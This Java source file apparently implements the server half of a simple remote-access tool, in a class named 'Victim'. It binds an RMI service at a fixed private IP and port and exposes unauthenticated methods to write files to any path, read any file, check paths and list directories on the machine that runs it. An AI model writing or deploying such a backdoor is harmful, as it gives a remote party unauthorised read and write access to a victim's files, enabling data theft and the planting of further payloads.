import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.util.ArrayList;

 public class Victim extends UnicastRemoteObject implements Ddd
{
	Victim()throws RemoteException
	{}
	public boolean uploadd(ArrayList<Integer>x,String name)throws RemoteException
	{
		
			try
			{
				FileOutputStream fout=new FileOutputStream(name);
				for(Integer xx: x)
				fout.write(xx);
				fout.close();
			}catch(Exception e)
			{
				System.out.println(e);
				return false;
			}
			
			return true;
		
		

	}
	public ArrayList<Integer> downloadd(String xx)throws RemoteException
	{
		File f=new File(xx);
		int x;
		ArrayList<Integer>data=new ArrayList();
		if(f.isFile())
		{
			try
			{
				FileInputStream fin=new  FileInputStream(f);
				while(true)
				{
					x=fin.read();
					if(x!=-1)data.add(x);
					else break;
				}
				fin.close();
			}catch(Exception e)
			{
				return null;
			}
			
			return data;
		}
		return null;
	}
	public boolean check(String x)throws RemoteException{
		return new File(x).exists();
	}
	public String[] listing(String x)
	{
		return new File(x).list();

	}


}
 class Main
{
	public static void main(String ar[])throws Exception
	{
		Victim m=new Victim();
		String x="192.168.43.101";

		Naming.rebind("rmi://"+x+":45678/demo",m);
	}
}